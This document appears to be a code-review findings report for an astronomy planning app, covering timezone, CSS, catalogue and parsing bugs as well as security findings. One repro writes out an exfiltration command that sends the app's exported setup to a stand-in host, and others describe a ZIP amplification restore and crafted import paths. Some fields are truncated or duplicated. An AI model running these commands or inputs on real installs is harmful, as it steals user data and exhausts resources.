findings.repro: open the wizard with no site, type coordinates, make the first `POST /api/sites` answer after >20 s (throttle/proxy/loaded machine), wait for the guard message, click Next again.
findings.requiredFix: keep the in-flight promise per step and re-await it instead of re-validating, e.g. `_pending = st.validate(); const done = await Promise.race([_pending, timeout]);` and on a later Next reuse `_pending` (clearing it when it settles). Smallest honest change; no refactor.
findings.counterArgument: the 20 s guard is what AGENTS.md asks for ("a 20 s guard unsticks a hung validate"), and reaching it needs a 20 s+ request - a local SQLite `POST /api/sites` normally answers in milliseconds. So this is a rare-but-real state, not an everyday path; a single site is never lost.

findings.title: `tzOffAt` mis-parses a half-hour offset, shifting the desktop day grid by 30 min on one date a year
findings.file: line: `core/time.js:25` (`/GMT([+-])(\d{1,2}):?(\d{2})?/`), consumed by `static/js/util.js:89` -> `static/js/planning_client.js:173`; cross-reference: the parser lives in `core/time.js` (core/reference lane owns the fix); this is the desktop-side *consequence* (the grid anchor), not a second root cause.
findings.impact: for a half-hour DST zone (Lord Howe, +10:30/+11:00) the desktop grid is anchored 30 min off for that date, so every timestamp the desktop derives from the grid - the scrub label, the altitude chart's x-axis, `#nightInfo`'s window marker positions - is shifted by 30 min, and "now" lands on a sample 30 min away instead of the nearest one. The provider is not affected: `fmtT` uses the IANA zone directly.
findings.mechanism: `Intl`'s `longOffset` is colon-formatted (`GMT+10:30`), but the regex only accepts `(\d{1,2})` optionally followed by `:?(\d{2})?`; `\d{1,2}` greedily matches `10` and the `:30` is discarded, so a +10:30 zone reports 600 min instead of 630.
findings.evidence: `node reviews/0.6.32-full/evidence/desktop/tz_halfhour.mjs` ``` BAD  Australia/Lord_Howe 2026-10-03 tzOffAt=660 core=660 Intl=630 -> grid shifted by 0.5 h (9 of 10 cases - KOLKATA 330, KATHMANDU 345, ADELAIDE 630, ST_JOHNS -210, CHATHAM 825, BERLIN 120, NY -240 - are correct) ``` `node .../dst_grid.mjs` shows the consequence: `Australia/Lord_Howe 2026-10-03 grid=24.00h tzOff=660` while the true noon offset is 630.
findings.repro: set the timezone to `Australia/Lord_Howe` (or any +xx:30 zone), pick the date on which that zone's DST starts (2026-10-04 there), and read `#timeLabel` against the real clock: the grid's samples sit at :33/:39/... instead of :00/:06.
findings.requiredFix: match the colon explicitly, e.g. `GMT([+-])(\d{1,2})(?::(\d{2}))?`, in `core/time.js:25` (a core change => `scripts/build_core.py` re-bake).
findings.counterArgument: narrow. Exactly one calendar date per year per half-hour zone is wrong - the date on which the DST *start* happens (noon still at the old `+xx:30`, i.e. `2026-10-03` for Lord Howe). The transition date itself (`2026-10-04`) already reports the new whole-hour offset and is correct in my probe, and an ordinary date such as `2026-09-12` was not affected in any of the zones I tested. Whole-hour zones (Berlin, New York), fixed half-hour zones (Kolkata, Kathmandu) and 45-minute zones (Kathmandu) all parse correctly, so this is not a general "half-hour zones are broken" bug.

findings.title: the classic theme forces a 548 px minimum page width, so the web planner scrolls horizontally on every phone-sized viewport
findings.file: line: `web/style.css:72` and `web/style.css:74` (cause); `web/style.css:31` (why it is not contained); `web/themes.css:341` (why dome hides it)
findings.impact: with the Classic theme selected - one of the two themes offered in the hamburger menu (`web/index.html:82-83`) - the page is 548 px wide on any viewport up to ~480 px, so the whole page scrolls sideways, the topbar's night/moon information and the right-hand controls sit off-screen, and the layout never reflows. Every phone in portrait is in that range (320/360/375/ 390/412/430). Measured identical docW=548 at 320, 360, 400 and 480.
findings.mechanism: `.topbar-right` is a flex row with **no `flex-wrap`** (`style.css:72`), and one of its children, `.nightinfo`, is `white-space: nowrap` (`style.css:74`). Its min-content width is therefore the sum of its children (~526 px, measured: `topbar-right` rect `L22 R548 W526`), which it cannot shrink below. The parent `.topbar` does wrap (`style.css:31`), so the group moves to its own line - and then overflows the page instead of the bar. The dome theme masks the same container defect by removing the offending child below 900 px (`html[data-theme="dome"] .nightinfo { display: none }`, `themes.css:341`), which is why dome is clean at 360-480 and classic is not.
findings.evidence: `python reviews/0.6.32-full/evidence/ui_probe.py` (`ui_measurements2.json` -> `overflow.classic`): `vw=320 docW=548 n=34 worst=body>.topbar>.topbar-right`; `vw=360 docW=548 n=10`; `vw=400 docW=548 n=8`; `vw=480 docW=548 n=8`; no overflow at 600 and above. Independently reproduced by the earlier pass (`ui_measurements.json` -> `themes.classic`, `vw=320 scrollWidth=548`, `n=24`; `vw=360 scrollWidth=548`, `n=10`), and the same pass records `topbar-right` text `moon 24% . Waxing Crescent . dark 19:21-02:42` placed at `R548`.
findings.repro: serve `web/`, `localStorage.setItem('nightseam_theme','classic')`, viewport 360x900 -> `document.documentElement.scrollWidth === 548`.
findings.requiredFix: give the group permission to wrap and to shrink `.topbar-right { flex-wrap: wrap; min-width: 0; }` plus letting `.nightinfo` wrap or shrink (`white-space: normal` under a narrow-width media query, or `min-width: 0; overflow: hidden; text-overflow: ellipsis`). The dome-only `display:none` at `themes.css:341` can then be dropped or kept as taste. `web/style.css` is a tokenized module (`style.css?v=21`), so the fix must bump its `?v=` in the same commit.
findings.counterArgument: `AGENTS.md` calls Classic "a flat fallback, not a second language", so a reviewer could call it out of scope. It is still one of exactly two shipped, user-selectable themes and the only alternative to the default, so a phone user who picks it gets a broken page; the underlying defect is in the BASE stylesheet (`style.css`), which dome merely papers over - any third theme or a taller `.topbar-right` child would hit it too. What would make this not a bug: if mobile web were explicitly unsupported, but the project's own gate tests 360 px (`tests/browser/web_suite.py:550`).
findings.captainVerification: UPHELD as high. Reproduced by the captain in two independent browser passes (different scripts): docW 548 at 320/360/400/480, clean at 600+. Mechanism read from CSS: .topbar-right has no flex-wrap (web/style.css:72) with a nowrap child (style.css:74); dome hides that child below 900 px (themes.css:341).

findings.title: dome's muted text colour `#67749c` is ~4.1-4.3:1 on its own glass surfaces, under the 4.5:1 AA threshold for 12 px text
findings.impact: in the DEFAULT theme, the brand tagline ("night-planning, computed in your browser") and the whole footer are rendered at 12 px below AA contrast. Low severity - both are secondary text - but it is a measurable accessibility miss in the default look, and the equivalent classic text passes (6.59:1).
findings.mechanism: `#67749c` over the composited dark surfaces. Relative luminance 0.1777 against a background of 0.0058 (`#0b111f`, the glass bar composited over the page) gives 4.08:1; against the measurement's resolved background `rgb(7,10,21)` it is 4.28:1. Both are below 4.5.
findings.evidence: `ui_measurements2.json` -> `contrast.dome`: `tagline 4.28:1 rgb(103,116,156) 12px` FAIL, `footer 4.28:1 rgb(103,116,156) 12px` FAIL; `contrast.classic`: `tagline 6.59:1` and `footer 6.59:1` both ok.
findings.repro: load the web planner with `nightseam_theme=dome` and read `getComputedStyle(document.querySelector('.tagline')).color` -> `rgb(103, 116, 156)`.
findings.requiredFix: lift `#67749c` to about `#7d8bb5` (>= 4.5:1 on the same surfaces) in both rules, or raise these two to 14 px+ and treat them as large text (>= 3:1, which `#67749c` already clears). `themes.css?v=4` must be bumped in the same commit.
findings.counterArgument: my compositor reads only `background-color`; a `color-mix()`/gradient surface is skipped, so the resolved background is approximate (the two candidate values give 4.08 and 4.28). This does not change the verdict - every plausible candidate surface is darker than the 4.5:1 crossover for this foreground - but it is why the number is quoted as a range. Also arguable: WCAG conformance is not a stated project goal for this app, and 12 px secondary text is a minor issue.

findings.title: at 320 px the dome theme's target rows overflow the viewport by 7 px
findings.impact: on a 320 px-wide device the page is 327 px wide, so the target list scrolls sideways slightly; 21 elements are reported outside the viewport, all inside the `.p-right` visual/score column (`100% of night . 7h 30m visible`, `81 deg`).
findings.mechanism: the right-hand column of a `.pick li` row is `nowrap` and has no shrink/truncate rule, so a long visibility string sets a floor above the container width at 320 px. Clean from 360 px up.
findings.evidence: `ui_measurements2.json` -> `overflow.dome`: `vw=320 docW=327 n=21 worst=.pick>li>.p-right`; no other dome width overflows. Reproduced in the earlier pass (`vw=320 scrollWidth=327`) with the same worst element.
findings.repro: viewport 320x900, dome theme, Tonight tab -> `document.documentElement.scrollWidth === 327`.
findings.requiredFix: allow the column to shrink and ellipsise (`.pick .p-right { min-width: 0; overflow: hidden; text-overflow: ellipsis; }`) or let the row wrap below ~380 px. Bump `style.css?v=`.
findings.counterArgument: 320 px is the narrowest phone still in use (iPhone SE 1st gen); 7 px is small and the affected content is still reachable by scrolling. A reviewer could downgrade this to a nit.

findings.title: the dome active-tab label is ~4.42:1 over the dark end of its gradient
findings.impact: the selected tab's label sits at 5.94:1 over `#8f7bff` but 4.42:1 over the gradient's `#7a5cff` end - marginally under AA for 13 px text. Filed as a nit because it is a 0.08 miss at one end of one pill and is invisible in practice.
findings.mechanism: the pill's background is `linear-gradient(135deg, #8f7bff, #7a5cff)`, so the effective background varies across the label; the gradient's lower-right end is dark enough that the fixed `#0a0d1a` foreground drops below 4.5:1 where the label's glyphs overlap it. A single solid colour would not have this property.
findings.evidence: computed by hand from the two gradient endpoints using the same luminance function as the probe (the probe itself cannot see a gradient, see the refutation below).
findings.repro: read `web/themes.css:152-155`; compute the WCAG ratio of `#0a0d1a` against each gradient stop - `#8f7bff` gives 5.94:1, `#7a5cff` gives 4.42:1.
findings.requiredFix: darken the text further (`#05070f` -> 4.9:1 at the worst end) or flatten the gradient toward its lighter end.
findings.counterArgument: purely a rounding-level miss, and the gradient is decorative; no user is likely to be affected.

findings.title: the desktop shell still advertises 12,160 objects and omits the supplement
findings.impact: the desktop Advanced-mode hint reads "advanced adds the complete OpenNGC
findings.mechanism: the desktop Advanced-mode hint reads "advanced adds the complete OpenNGC catalog - NGC/IC plus its addendum (12,160 objects to magnitude 20)", i.e. it understates the shipped catalogue by 16 and claims Advanced adds no supplement. The web twin was corrected to 12,176 + "a 16-object supplement" at 0.6.29 (`git log -S "12,176" -- web/index.html` -> `365dc0e`); this line was last touched at 0.6.26 (`d412998`) and survived 0.6.28 (`4bcbcd9`) and 0.6.29 unchanged, so the two shells contradict each other about the same catalogue. A user who reads the advanced-mode hint in the desktop menu is told a smaller catalogue than the one he sees when he ticks the box (Advanced really loads all 12,176: `static/js/main.js:56` -> `/api/catalog?adv=1`).
findings.evidence: `git show 4bcbcd9:static/index.html` -> `(12,160 objects to magnitude 20)`; same text in `git show d412998:static/index.html`; current `read static/index.html offset=122 limit=12`. Sweep of `web/ static/ landing/` shows every other site already at 12,176 (web/index.html:7,105,205; web/app.js:6; landing/index.html:7,9; landing/about.html:39).
findings.repro: open the desktop app -> hamburger -> Advanced -> read the hint; compare with `(Get-Content app/data/openned.csv | Where-Object { $_ -notmatch '^#' -and $_.Trim() }).Count` = 12176.
findings.requiredFix: in `static/index.html:127-129` use the web wording, i.e. "advanced adds the complete catalog - NGC/IC plus its addendum and a 16-object supplement OpenNGC cannot carry (12,176 objects to magnitude 20)". No token bump needed for an HTML-only text change, but bump `app.js?v=` only if a JS file is touched.
findings.counterArgument: `tests/test_catalog_integrity.py::test_advertised_catalog_size_matches_the_shipped_catalog` deliberately pins only the six `web/`+`landing/` sites (`ADVERTISED_SITES = 6`) and the desktop shell is out of that test's scope - so this is an *unguarded* copy site, not a broken guard. It is also only visible inside the Advanced menu. Neither makes the number correct; 0.6.29's own changelog sold "12,176 objects" to the user, so the desktop hint is simply stale.

findings.title: the desktop search does not index `primary_name`, and `core/catalog.js` documents the opposite rule
findings.impact: the desktop target filter is
findings.mechanism: the desktop target filter is `if (q && !(m.search || "").toLowerCase().includes(q)) return false;` - only the CSV `search` column. The web instead builds `searchBlob(o)` = id + `primary_name` + messier + ngcic + other + type + constellation + blurb (`core/catalog.js:36-39`, used at `web/app.js:125`). The two models differ because the *display name is not in `search` for every row*: the build appends the designation to a shared common name (`scripts/build_adv_catalog.py:202`) and `search` keeps only the bare name, so 12 shipped rows (`ic4703`, `ngc4038`, `ngc4039`, `ngc4435`, `ngc4438`, `ngc4567`, `ngc4568`, `ngc6611`, `ngc6992`, `ngc6995`, `ic1318`, `sh2-240`) do not contain their own displayed label. Typing the exact label the desktop list shows ("Eagle Nebula (NGC 6611)") finds nothing there while the web finds it. The comment above `searchBlob` says "The desktop searches the server's designation blob instead (`app/catalog_data.py`); the two models stay per-shell" - the desktop searches nothing of the sort (it uses the same client-side `m.search`), and `catalog_data.py` has no blob, so the comment documents a divergence that no longer exists and hides the real one.
findings.evidence: `Select-String -Path web\app.js,static\js\*.js -Pattern searchBlob` -> only `web/app.js:125` and the stub exports; reading `static/js/targets.js:122-135` shows the `m.search`-only filter. "rows whose primary_name is NOT in search" over the shipped CSV = the 12 ids above.
findings.repro: desktop, search `Eagle Nebula (NGC 6611)` -> no rows; search `Eagle Nebula` -> 2 rows.
findings.requiredFix: search the same shape as the web (e.g. test `m.search` **or** `m.primary_name`), or add the disambiguated `primary_name` to the build's `search` value; fix the `core/catalog.js` comment to describe the real per-shell models.
findings.counterArgument: the bare name *is* searchable, so no object is unreachable by its common name only by the exact label the row displays. The web/desktop "models stay per-shell" note could be read as licensing the difference, but the note itself is factually wrong about what the desktop does, which is why I file it.

findings.title: `_read_catalog_csv`/`match_popularity.read_csv` mis-parse a field containing `;`
findings.impact: the generator writes with `csv.writer(delimiter=";")`, which QUOTES any field
findings.mechanism: the generator writes with `csv.writer(delimiter=";")`, which QUOTES any field containing `;`, `"` or a newline; every downstream reader instead does a naive `line.rstrip("\n").split(";")`. A future source row with a quoted field would therefore be silently dropped by `_read_catalog_csv` (`len(vals) != len(cols) -> continue`) and by the matcher (`len(parts) < 10 -> continue`), and `tests/test_catalog_integrity.py::_adv_rows` would fail with a confusing "field count" assertion instead of naming the cause. Today the crisis is masked: the shipped CSV has 0 quoted fields, 0 rows whose naive split is not 14 fields and 0 `\r`, so the readers and the writer agree.
findings.evidence: `probe1_data.py` -> `rows whose naive ';' split is not 14 fields: 0`, `rows containing a double quote: 0`, `csv-module parsed rows: 12176 field counts: {14: 12176}`.
findings.repro: append a row whose `other` field contains `;` (e.g. `x;y`) to a COPY of the CSV and load it with `_read_catalog_csv` -> that row is skipped with no warning.
findings.requiredFix: parse with `csv.reader(..., delimiter=";")` in `database._read_catalog_csv` and `match_popularity.read_csv` (or assert at build time that no field needs quoting and fail loudly).
findings.counterArgument: this is a robustness-only defect with no shipped-data impact (the OpenNGC columns use `,`/`|` as separators), so it is a latent trap rather than a current user-facing bug - hence low, not medium.

findings.mechanism: two identical definitions; the second silently shadows the first. No behaviour change today, but the lane's canonical "how many advanced rows are there" accessor is duplicated, so a future edit to one of them (e.g. a filter, a cached count) takes effect or not depending on which one the editor happened to see - and the dead one is invisible to coverage and to grep-by-eye.

findings.title: the cached-the popularity source index silently loses a colliding key pair
findings.impact: the index is keyed by `normalize(name)` and the dict branch overwrites
findings.mechanism: the index is keyed by `normalize(name)` and the dict branch overwrites (`tel_index[norm] = (k, score)`), so the LAST entry in *source order* wins - a source-order-dependent choice, which is exactly the class of bug the `match_objects` docstring says was fixed. In the shipped cache `data/popularity_snapshot.json` one pair collides: `"NGC 654 2"` (115) and `"NGC 6542"` (3) both normalize to `ngc6542`, and `ngc6542` is shipped with score 3 instead of 115.
findings.evidence: `probe5_pop.py` -> `popularity names colliding after normalize: 1 ['ngc6542']`, `ngc6542 -> [('NGC 654 2', 115), ('NGC 6542', 3)] index keeps: ('NGC 6542', 3)`.
findings.repro: `python -c "import json,re;d=json.load(open('data/popularity_snapshot.json',encoding='utf-8'));n=lambda s:re.sub(r'(?<![0-9])0+(?=\d)','',re.sub(r'[\s\-\.\(\)]+','',s.lower()));print([(k,d[k]) for k in d if n(k)=='ngc6542'])"` -> 115 and 3.
findings.requiredFix: make the collision explicit - keep the highest score for a colliding key (like `match_objects`) or skip ambiguous keys; do not let file order decide.
findings.counterArgument: `"NGC 654 2"` is almost certainly a popularity-source typo for NGC 6542 itself, the affected row (`ngc6542`, a V=13.5 galaxy) is far outside the top 200, and 3-vs-115 changes no ordering a user can see - so the user impact is nil today. It is filed as the guard-level defect (a source-order tiebreak in the matcher that the docstring claims cannot happen), not as a score error worth a re-bake.

findings.title: a COMMITTED missed `CATALOG_TOKEN` bump is invisible, and no release gate runs the catalog guard at all
findings.impact: the ~4 MB `web/catalog.json` keeps being served from the browser cache under an unchanged `catalog.json?v=9` URL, so a catalog fix never reaches a returning visitor (the 0.6.12 defect).
findings.mechanism: the only "bytes changed, token did not" rule is `git diff --quiet HEAD -- web/catalog.json`, empty after the commit; the manifest/token comparison is self-consistent as soon as the manifest `sha256` is refreshed (what the documented workflow asks for). `check_js_tokens`' one-way baseline covers JS modules, not this data token, and neither `pre_tag_check.py` nor `check_release.py` calls this guard.
findings.evidence: copies of the three real files + the REAL clean git -> `guard verdict for the shipped (committed) shape: []`; control with a faked dirty tree -> `web/catalog.json differs from HEAD but CATALOG_TOKEN in web/app.js does not`.

findings.requiredFix: record a verified `{token, sha256}` catalog baseline (or extend the js-tokens baseline) so the rule is commit-state independent, and wire the guard into `pre_tag_check.py`
findings.counterArgument: the manual rule is documented, the docstring states the HEAD rule needs a working-tree diff, and `check_js.py` catches the slip whenever it runs before committing.

findings.title: `check_core.py`'s MOVED scan misses a core concept re-implemented as an object property

findings.mechanism: `sneak` needs `name\s*=` or `name(...) {` preceded by line start / `;` / `}`; an object property (`name: (…) => …`) or a method on the same line as `{` matches neither.
findings.evidence: `web/zz_l7_probe_a.js` = `export const SUN = { precessJ2000ToDate: (jd) => jd + 1, };` -> `check_core: OK` (exit 0); positive control `export function precessJ2000ToDate(...)` -> `precessJ2000ToDate() must live in core/ only` (exit 1); `test_core_drift.py:158-161` lists four evasions, not this one.
findings.repro: `python reviews/0.6.32-full/evidence/tests/probe_guard_holes.py`

findings.counterArgument: the least natural of the covered forms, and a shell importing the real helper is the only way to behave correctly anyway.

findings.title: `check_js_imports.py` never resolves `export … from`, so a broken re-export can ship a dead app in both shells

findings.title: a setup restore has no aggregate byte cap: ~1:1000 disk amplification from one crafted ZIP, up to ~2 GiB RAM per member
findings.impact: a shared/hostile "setup backup" the user imports can fill the disk (the 2 GiB cap counts *compressed* bytes; nothing caps total restored bytes) and spike RAM by ~2 GiB in one allocation per member.
findings.mechanism: `_read_member` caps ONE member at 1 GiB but accumulates a `bytearray` then copies it with `bytes(out)` (2x peak); no cap on the sum or the record count.
findings.evidence: 10 records x 4 MiB payload = 40 MiB written from a **42,096-byte** zip (ratio 996:1, 0.14 s); `_read_member` peak RAM for an 8 MiB member read with an 8 MiB limit = **16.0 MB** (2x) => the default 1 GiB limit admits ~2 GiB.
findings.repro: `python reviews/0.6.32-full/evidence/security/zip_hostile_probe.py` > keys `amplification`, `read_member_ram`.
findings.requiredFix: cap the SUM of restored bytes (fixed budget or upload x N) and stream each member with `shutil.copyfileobj` instead of materialising it.
findings.counterArgument: the user must choose to import the hostile ZIP (no fetch-a-backup flow) and 2 GiB on a 64-bit desktop usually swaps rather than dies resource-exhaustion hardening, not a remote exploit. CONFIRMED from measured amplification + measured 2x peak, extrapolated to the shipped limit.

findings.title: the desktop update check runs third-party JSONP inside the privileged localhost origin
findings.file: `static/js/updater.js:10,29-31,51`; `main.py:242` (API + UI share `127.0.0.1:8407`); no CSP and no `integrity` in `static/index.html`.
findings.impact: `ns-version.js` from `https://nightseam.de` executes as a script **in the app's own origin** 3 s after every launch (`main.js:168`). Whoever controls that response (compromised site, hijacked DNS/CA) gets a same-origin script that can read `/api/export` (whole setup + image library), `/api/state`, `/api/library` and call every state-changing route.
findings.evidence: `http_api_probe.py` - `plain_get_export` 200 (`GET /api/export`, no auth), `plain_get_state` 200 and leaks `image_dir: C:\Users\<user>\Documents\NightSeam Images` (also on `/api/library`); no response carries `access-control-allow-origin`, so only a script in that origin can read them.
findings.repro: in a browser running the packed app, stub the update URL with `fetch('/api/export').then(r=>r.blob()).then(b=>navigator.sendBeacon('https://x/',b))` and observe the request leave (or run that fetch from the app's own console).
findings.requiredFix: ship the update as JSON (`version.json` + a CORS header on that one static file) and `fetch()` it; JSONP is only needed because the site sends no CORS.
findings.counterArgument: it is the project's own site and every desktop updater shares this trust; it needs a third-party compromise. SUSPECTED because no browser was available here to observe the exfiltration - a real-browser run with a stubbed `ns-version.js` confirms it.

findings.title: `GET /api/shutdown` is a state-changing GET and the anti-cross-site guard fails open when the headers are absent
findings.impact: any client that omits `Sec-Fetch-Site`/`Origin` is treated as same-origin, so a browser that sends neither (pre-16.4 Safari, many embedded webviews, any local process) lets *any web page the user visits* kill the app with ``. Denial of service, not a leak (responses stay unreadable without CORS).
findings.evidence: `http_api_probe.py` - cross-site GET **403**, cross-site form POST **403**, cross-site multipart POST **403**, rebound `Host` **403**, forged same-origin 200, no headers -> 200:(`_state["shutdown"]` set).
findings.repro: `python reviews/0.6.32-full/evidence/security/http_api_probe.py`.
findings.requiredFix: make shutdown `POST`-only (the UI already uses `api()`), or require a per-install token that `main.py` passes to the window it opens.
findings.counterArgument: every current browser sends `Sec-Fetch-Site`, so the vector is blocked there (verified above), the Host guard blocks rebinding, and the impact is one restart.

findings.title: `.gitignore` does not cover `data/`: an interrupted export leaves the user's whole setup untracked-but-committable
findings.impact: `app/server.py:679` spools the export to `data/.export-<hex>.zip` inside `data/`:; if the download is aborted or the app is killed the file stays, is not ignored, and the setup ZIP (sites/rigs/panoramas + the whole image library) is one `git add -A` from being committed. `nightseam.db-journal` is the same story for raw DB pages.
findings.evidence: `git check-ignore` - `data/.export-deadbeef.zip` **not ignored**, `data/nightseam.db-journal` **not ignored**, `data/anything.json` **not ignored**; `data/nightseam.db.backup-auto.zip` ignored. `pragma journal_mode` = `delete` and a write transaction really creates `jm.db-journal` (measured). `git ls-files data` = only `data/panos/.gitkeep`.
findings.repro: `git check-ignore -v data/.export-deadbeef.zip data/nightseam.db-journal`.
findings.requiredFix: ignore `data/` and re-include `!data/panos/.gitkeep`, instead of enumerating artefacts.
findings.counterArgument: nothing is committed today, `AGENTS.md` forbids it, and the listed patterns cover the normal artefacts - but the documented rule ("never commit `data/`") is not what the file implements, and the two uncovered names hold user data.

findings.title: the import boundary stores records that can never resolve, and writes payloads for records it dropped
findings.impact: a crafted bundle leaves a panorama row advertised by `/api/state` that 404s forever, and/or drops junk into `data/panos`; a control character in `file` additionally aborts the restore with a 500 *after* the DB replace (that abort is the python lane's partial-restore item).
findings.mechanism: `safe_rel` rejects only NUL, `..`, absolutes, trailing-dot/space and device segments - `\x01`, `\n`, `\t`, `\x1b` pass - while Windows rejects them at `write_bytes`; and the payload loop iterates the RAW `panos` list, so a record whose id failed `safe_token` still gets its payload written.
findings.evidence: `file: "a\x01b.jpg"` -> row kept, then `OSError: [Errno 22] Invalid argument: ...\a\x01b.jpg`; id `..\evil` + file `planted.jpg` -> row dropped but `planted.jpg` **written** into `data/panos` and counted in `pano_images: 2`; `link_escape_probe.py` -> a junction under `data/panos` makes `safe_join` return `None`, yet the row is stored (`rows: ["escape/pwned.jpg"]`) with `pano_images: 0` - nothing escaped.
findings.requiredFix: reject control characters in `_segment_ok`, and drive the payload loop from the records `import_bundle` actually accepted (return them).
findings.counterArgument: nothing escapes `data/`, no NightSeam export produces these shapes, and the pre-import state stays recoverable from the auto-backup.

findings.title: the web planner feeds unvalidated third-party JSON into scoring, with no size or time limit
findings.impact: if `popularity-source.invalid` returns a non-numeric value (`"n/a"`, `{...}`) every affected score is `NaN` and the ranking comparator returns `NaN` - an invalid ordering whose result is engine-defined; `true` silently becomes factor 0.3. No `AbortController`/timeout and no body-size limit, so a huge/endless response is buffered whole by `r.json()`.
findings.evidence: `popularity_malformed.mjs` against the real baked core `non_numeric_string` -> `factor: "NaN"`, `nested_object` -> `"NaN"`, `boolean` -> `0.3`, `comparator_sample: "NaN"`, intended order not reproduced. The default `_popMap = {}` is also a prototype lookup: `_popMap["constructor"]` is a function -> `NaN`.
findings.repro: `node reviews/0.6.32-full/evidence/security/popularity_malformed.mjs`.
findings.requiredFix: `Number.isFinite(v) && v > 0` with an own-property check on a `Object.create(null)` map; add a timeout + size guard before parsing.
findings.counterArgument: numeric strings coerce fine, so only a real schema break or a hostile third party triggers it, and the baked catalog field covers offline. The end-to-end browser path was NOT run.

findings.title: the web panorama upload has no size cap: full-resolution decode plus a session-long base64 copy
findings.file: `web/horizon.js:564-571` (`readAsDataURL` of `files[0]`, no `f.size` check), `:540-550` (`p._img = imgDataUrl` kept for the session), `:86-98` (`compressImage`).
findings.impact: the picked file becomes a data URL (~1.37x its size) and is decoded at FULL resolution by `new Image()`; a 60 MB / 10000x5000 panorama holds ~80 MB of string plus a ~200 MB RGBA bitmap in the tab, and the 1400 px downscale happens afterwards a tab crash on a phone. The desktop caps the same feature at 60 MB / 4096 px.
findings.evidence: read from the code path; `grep file.size` in `web/` = no match; data-URL inflation is exactly 4/3.
findings.repro: Chrome DevTools > Memory, web panorama editor, drop a 60 MB JPEG on a 4x CPU throttle; watch tab private bytes.
findings.requiredFix: branch on `f.size` (e.g. > 15 MB) and decode via `createImageBitmap(file, {resizeWidth: 1400})` instead of a data URL.
findings.counterArgument: the user chose the file, `p._img` is per-record and released with the view, and most amateur panoramas are a few MB - SUSPECTED (no browser here).

findings.title: the image cache grows forever and has no cleanup path
findings.impact: every distinct object whose detail view is opened (plus the ~200 standard objects the boot prefetch warms) leaves a `<slug>.bin` + `<slug>.json` pair that is never evicted, and neither shell offers a "clear image cache" control. Measured: 440 files / 24.8 MB / 220 objects ~= 113 KB each:; the advanced catalog has 12,176 objects, so a user who browses it reaches ~1.3 GB with no way back.
findings.evidence: `Get-ChildItem data\imgcache` (440 files, 26,021,093 bytes, 0 negative markers); no prune/clear of `CACHE_DIR` outside tests. (Logs are fine: `main.py:27` rotates at 1 MB x2; baked core trees are pruned to N-1 by `scripts/build_core.py`.)
findings.repro: count `data/imgcache` after opening ~50 advanced-object detail views.
findings.requiredFix: an LRU byte cap enforced in `fetch_image`, plus a "clear cached images" action in Setup.
findings.counterArgument: 25 MB is harmless today and a re-fetch is cheap - but it is the one cache with no owner or limit.

findings.title: `AGENTS.md`'s opening blurb still calls the astronomy "pure-Python", the one layer the project spent a release deleting; an agent reading the contract's first paragraph looks for or re-creates the wrong implementation.
findings.file: doc: `AGENTS.md:14` ("UI, pure-Python Meeus astronomy (no numpy/astropy)") vs reality: `AGENTS.md:44-45` + `app/` + `core/`

It says the astronomy is Python; the same file's Phase C section and the tree say the Python astronomy modules were DELETED in 0.6.20 and `core/` is the only implementation. A reader/agent acts on the blurb: looks for `app/astro.py`, or worse re-adds astronomy math to `app/` - which `scripts/check_core.py` then fails (`check_core: OK` today, i.e. the guard is live). Severity is set by the misleading-layer test, not by user; no user sees this.
findings.mechanism: :the blurb is a pre-0.6.20 summary; 0.6.20's Phase C removed the Python math and the blurb was never reworded.
findings.evidence: :`Test-Path app/astro.py, app/planning.py, app/nightcalc.py` → `False, False, False`; `Get-ChildItem core -Name` → 9 modules (`astro.js`, `planning.js`, ...); `AGENTS.md:44` "The Python math modules (`app/astro.py`, `app/planning.py`, `app/nightcalc.py`) ... are DELETED". The same blurb also claims "Works fully offline except optional Wikipedia images", which `static/js/weather.js:49` and `static/js/updater.js` contradict (see DOC-03).
findings.repro: :`Select-String AGENTS.md -Pattern 'pure-Python'`; `Test-Path app/astro.py`; read `AGENTS.md:44`.
findings.requiredFix: :rewrite `AGENTS.md:13-16` to say the astronomy/planning math lives in `core/` (shared, baked into both shells) and that the app reaches the network for weather, the update check and (web) the popularity source. One sentence.
findings.counterArgument: :the blurb is marketing-grade prose and the file contradicts it 30 lines later, so a careful reader self-corrects. That is why this is medium and not high - but "careful reader" is exactly what the contract exists to replace. (Not a historical record: `AGENTS.md` is the live contract.)

findings.title: the public web planner contacts `popularity-source.invalid` on every boot, and no user-facing page discloses it; the privacy page enumerates the planner's network activity without it and opens with "no tracking, no analytics".
findings.file: doc: `landing/privacy.html:33-35` + `:37-52` (and the credit lists `web/index.html:205`, `landing/index.html:7,9`) vs reality: `web/app.js:96-105` + `:2520-2521`
findings.impact: :a visitor to `nightseam.de/astro` sends their IP, User-Agent and `Referer` to a third-party commercial site on page load. The page the user would consult to learn what leaves their browser is the one that omits it. The request has no functional value: the project's own gate documents that the response is unreadable anyway (no CORS header), so this is a privacy cost for zero gain.
findings.mechanism: :`loadPopularity()` (`web/app.js:96`) does `fetch('https://popularity-source.invalid/')`; `boot()` calls it unconditionally at `web/app.js:2521` (right after the catalog load, before user data), and `boot()` is invoked at `web/app.js:2866`. Nothing gates it on an opt-in, and the baked `o.popularity` fallback already covers ranking.
findings.evidence: :`git grep -ni popularity -- landing web README.md NOTICE` → hits only in `web/app.js` (source/comments), `web/core/<hash>/catalog.js|scoring.js` (comments) and `scripts/match_popularity.py`; **zero** hits in `landing/`, `web/*.html`, `README.md`, `NOTICE`. `landing/privacy.html:37-52` lists local storage, Open-Meteo, geolocation, Wikimedia - no the popularity source. `tests/browser/harness.py:271-281` (the project's own words): "stub the one external file the web app fetches at boot (The popularity source popularity; popularity-source.invalid sends no CORS header, so a live fetch is a console error even when the app catches it)".
findings.repro: :open `<repo>/web/index.html` served on any loopback port and watch the first requests. (I could not run that browser probe here - see "Not checked" - so the confirmation is the authoritative source plus the harness comment and the grep.)
findings.requiredFix: :disclose it in the same `landing/privacy.html` list ("Popularity data: the planner requests community popularity counts from the popularity source; the response is not readable by the page (no CORS) but the request carries your IP"), and add the popularity source to the footer/credit line in `web/index.html:205`. Or drop the live fetch and rely on the baked field, which is what actually happens in a browser.
findings.counterArgument: :the fetch is cross-origin and `credentials` defaults to same-origin, so no cookie or stored data can be attached or read, and the code catches failure; one could argue "no tracking" still holds (nothing is stored about the user). That is why this is a disclosure gap (medium), not a security hole - but "no tracking, no analytics" printed above a list of *all* the planner's network calls, with one missing, is a wrong user-facing privacy statement.

findings.title: `README.md` says weather is deliberately not included and that images are "the only online content", while the shipped desktop app has a weather panel that fetches Open-Meteo (and the same README documents the once-per-start version check).
